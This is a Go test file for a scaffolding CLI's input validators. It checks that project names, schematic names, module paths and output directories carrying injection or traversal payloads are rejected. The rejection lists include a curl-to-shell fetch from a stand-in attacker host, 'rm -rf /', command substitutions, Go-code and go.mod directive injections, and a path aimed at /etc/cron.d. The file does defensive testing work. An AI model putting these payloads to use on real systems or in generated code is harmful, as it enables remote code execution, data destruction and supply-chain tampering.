package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateProjectName(t *testing.T) {
	for _, name := range []string{"app", "my-app", "app.v2", "a_b", "0day"} {
		if err := validateProjectName(name); err != nil {
			t.Errorf("validateProjectName(%q) = %v, want nil", name, err)
		}
	}

	// The name is rendered as `PROJECT := {{.Name}}` and into the
	// Dockerfile's ldflags quoting: shell metacharacters are command
	// execution on the next `make` or `docker build`.
	for _, name := range []string{
		"$(shell curl -s attacker/x|sh)",
		"`id`",
		"app; rm -rf /",
		"app &&whoami",
		"app name",
		"app\nall:",
		`app"quote`,
		"../victim",
		"a/b",
		"-leading-dash",
		"UPPER",
		"",
		strings.Repeat("a", 65),
	} {
		if err := validateProjectName(name); err == nil {
			t.Errorf("validateProjectName(%q) = nil, want an error", name)
		}
	}
}

func TestValidateSchematicName(t *testing.T) {
	for _, name := range []string{"user", "userHandler", "user-handler", "handler2", "v1_2"} {
		if err := validateSchematicName(name); err != nil {
			t.Errorf("validateSchematicName(%q) = %v, want nil", name, err)
		}
	}

	// Templates put {{.Name}} inside Go string literals, so a quote ends
	// the literal and the rest becomes code that gofmt accepts.
	for _, name := range []string{
		`Foo = "x"; func init(){ os.Exit(1) }; var _ = "`,
		"x\"}\nfunc init(){}\nvar _ = \"y",
		"hello world",
		"a/b",
		"../escape",
		"name\twith\ttab",
		"name\nnewline",
		"$(id)",
		"`id`",
		"123abc", // exportName keeps the leading digit: `const 123abcKind`
		"",
	} {
		if err := validateSchematicName(name); err == nil {
			t.Errorf("validateSchematicName(%q) = nil, want an error", name)
		}
	}
}

func TestValidateIdent(t *testing.T) {
	if err := validateIdent("userHandler"); err != nil {
		t.Errorf("validateIdent(userHandler) = %v", err)
	}

	if err := validateIdent("123abc"); err == nil {
		t.Error("validateIdent(123abc) = nil, want an error")
	}

	if err := validateIdent(`x"; func init(){}; var _ = "`); err == nil {
		t.Error("validateIdent(injection) = nil, want an error")
	}
}

func TestValidateModulePath(t *testing.T) {
	for _, module := range []string{"github.com/myorg/app", "example.com/app/v2", "my.app"} {
		if err := validateModulePath(module); err != nil {
			t.Errorf("validateModulePath(%q) = %v, want nil", module, err)
		}
	}

	// go.mod is rendered as `module {{.Module}}`: a newline injects
	// require/replace directives.
	for _, module := range []string{
		"github.com/a\nrequire evil.com/x v1.0.0",
		"../evil",
		"/abs",
		"trailing/",
		"a//b",
		"a/../b",
		"has space",
		"",
	} {
		if err := validateModulePath(module); err == nil {
			t.Errorf("validateModulePath(%q) = nil, want an error", module)
		}
	}
}

func TestValidateOutputRoot(t *testing.T) {
	if err := validateOutputRoot("deploy/out"); err != nil {
		t.Errorf("validateOutputRoot(deploy/out) = %v, want nil", err)
	}

	if err := validateOutputRoot("/srv/app"); err != nil {
		t.Errorf("absolute output is explicit intent: %v", err)
	}

	for _, root := range []string{"../../../etc/cron.d", "..", "a/../../b"} {
		if err := validateOutputRoot(root); err == nil {
			t.Errorf("validateOutputRoot(%q) = nil, want an error", root)
		}
	}
}

// TestWriteGuardRejectsTraversal: every `sicky generate` schematic goes
// through writeGuard, so the path check there covers them all.
func TestWriteGuardRejectsTraversal(t *testing.T) {
	t.Chdir(t.TempDir())
	gf := &generateFlags{force: true}

	if code := writeGuard("../escape.go", "package x\n", gf, "test"); code != 1 {
		t.Fatalf("traversal exit code = %d, want 1", code)
	}

	if _, err := os.Stat(filepath.Join(os.TempDir(), "escape.go")); err == nil {
		t.Fatal("traversal wrote a file outside the working tree")
	}
}

// TestWriteGuardRejectsInvalidGo: a generated file that does not parse
// is worse than none at all.
func TestWriteGuardRejectsInvalidGo(t *testing.T) {
	dir := t.TempDir()
	gf := &generateFlags{force: true}

	bad := filepath.Join(dir, "bad.go")
	if code := writeGuard(bad, "package broken\nfunc {\n", gf, "test"); code != 1 {
		t.Fatalf("invalid Go exit code = %d, want 1", code)
	}

	if _, err := os.Stat(bad); err == nil {
		t.Fatal("invalid Go source was written to disk")
	}

	good := filepath.Join(dir, "good.go")
	if code := writeGuard(good, "package good\n", gf, "test"); code != 0 {
		t.Fatalf("valid file exit code = %d, want 0", code)
	}

	if _, err := os.Stat(good); err != nil {
		t.Fatalf("valid file was not written: %v", err)
	}
}

func TestRenderGenerateTemplateRejectsInjection(t *testing.T) {
	dir := t.TempDir()

	gc := &generateContext{
		Name:         `x"; func init(){ os.Exit(1) }; var _ = "`,
		ExportedName: exportName(`x"; func init(){ os.Exit(1) }; var _ = "`),
		Module:       "github.com/myorg/app",
	}

	out := filepath.Join(dir, "injected.go")
	if err := renderGenerateTemplate("template/prompt/prompt.go.gotmpl", out, gc); err == nil {
		t.Fatal("injection name accepted: want an error")
	}

	if _, err := os.Stat(out); err == nil {
		t.Fatal("injected source was written to disk")
	}
}

// TestScaffoldProjectRefusesNonEmpty: scaffolding used to overwrite an
// existing project (Makefile, go.mod, main.go, ...) unconditionally.
func TestScaffoldProjectRefusesNonEmpty(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module keep/me\n"), 0o644); err != nil {
		t.Fatalf("seed: %v", err)
	}

	nc := &newContext{Name: "app", Module: "github.com/myorg/app", Type: "standard"}
	err := scaffoldProject(dir, nc, false)
	if err == nil {
		t.Fatal("scaffoldProject overwrote a non-empty directory without --force")
	}

	if !strings.Contains(err.Error(), "not empty") {
		t.Fatalf("error = %v, want the not-empty message", err)
	}

	kept, rerr := os.ReadFile(filepath.Join(dir, "go.mod"))
	if rerr != nil || !strings.Contains(string(kept), "keep/me") {
		t.Fatalf("existing go.mod was modified: %s (%v)", kept, rerr)
	}
}
